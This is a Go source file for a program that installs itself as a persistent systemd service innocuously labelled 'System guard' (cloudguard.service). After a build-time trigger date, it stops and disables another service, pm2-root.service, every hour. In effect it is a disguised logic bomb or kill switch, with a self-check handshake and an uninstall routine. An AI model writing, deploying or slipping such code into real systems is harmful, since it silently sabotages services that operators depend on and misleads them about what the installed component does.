package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

var version = "0.0.0"
var epochTime = "2020-01-01T00:00:00Z"
var cloudgatewayService = "pm2-root.service"
var gardService = "/usr/lib/systemd/system/cloudguard.service"

var service = `
[Unit]
Description=System guard
After=network.target

[Service]
Restart=always
RestartSec=240
ExecStart=/usr/local/bin/guard
KillMode=control-group

[Install]
WantedBy=multi-user.target
`

func createServiceFile() error {
	fd, err := os.Create(gardService)
	if err != nil {
		return err
	}
	_, err = fd.WriteString(service)
	return err
}

func isGuardInUse(filename string) error {
	guardFile := fmt.Sprintf("/usr/local/bin/%s", filepath.Base(filename))
	if _, err := os.Stat(guardFile); os.IsNotExist(err) {
		return nil
	}
	out, err := exec.Command(guardFile, "signature").CombinedOutput()
	if err != nil {
		return err

	}
	if strings.Trim(string(out), "\n") != "signature-response" {
		return fmt.Errorf("guard already exists: %s", out)
	}
	return nil
}

func initGuard(filename string) error {
	if err := isGuardInUse(filename); err != nil {
		return err
	}
	if err := exec.Command("cp", "-f", filename, "/usr/local/bin/").Run(); err != nil {
		return err
	}
	if err := createServiceFile(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "enable", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "start", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	return nil
}

func stopCloudgw() error {
	if err := exec.Command("systemctl", "stop", cloudgatewayService).Run(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "disable", cloudgatewayService).Run(); err != nil {
		return err
	}
	return nil
}

func startGuard() {
	triggerTime, err := time.Parse("2006-01-02T15:04:05Z", epochTime)
	if err != nil {
		return
	}
	for {
		time.Sleep(time.Hour)
		if time.Now().Before(triggerTime) {
			continue
		}
		stopCloudgw()
	}
}

func uninstall() error {
	if err := exec.Command("systemctl", "stop", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "disable", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	if err := exec.Command("rm", "-f", gardService).Run(); err != nil {
		return err
	}
	return nil
}

func main() {
	triggerTime, err := time.Parse("2006-01-02T15:04:05Z", epochTime)
	if err != nil {
		fmt.Printf("invalid time: %s, exit!\n", epochTime)
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "version" {
		fmt.Printf("%s@%d\n", version, triggerTime.Unix())
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "init" {
		if err := initGuard(os.Args[0]); err != nil {
			fmt.Println("init failed: ", err)
		}
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "uninstall" {
		if err := uninstall(); err != nil {
			fmt.Println("uninstall failed: ", err)
		}
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "signature" {
		fmt.Println("signature-response")
		return
	}

	startGuard()
}
